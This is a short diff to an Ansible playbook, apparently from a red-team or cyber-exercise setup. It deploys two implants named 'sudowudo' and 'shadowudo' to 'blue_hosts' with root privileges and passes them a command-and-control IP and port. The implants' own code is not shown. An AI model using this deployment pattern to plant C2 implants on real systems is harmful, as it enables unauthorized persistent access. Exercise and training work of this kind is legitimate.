@@ -3,7 +3,7 @@
 - name: Deploy sudowudo/shadowudo
   hosts: blue_hosts
   remote_user: ubuntu
-  var:
+  vars:
     c2_ip: "10.0.1.242"
     c2_port: 4242
   become: yes
@@ -23,10 +23,10 @@
         - cmake
 
     - name: Deploy sudowudo
-      command: bash /tmp/sudowudo/deploy-sudowudo
+      command: sh /tmp/sudowudo/deploy-sudowudo {{ c2_ip }} {{ c2_port }}
 
     - name: Deploy shadowudo
-      command: bash /tmp/sudowudo/deploy-shadowudo
+      command: sh /tmp/sudowudo/deploy-shadowudo {{ c2_ip }} {{ c2_port }}
 
     - name: Delete content & directory
       ansible.builtin.file:
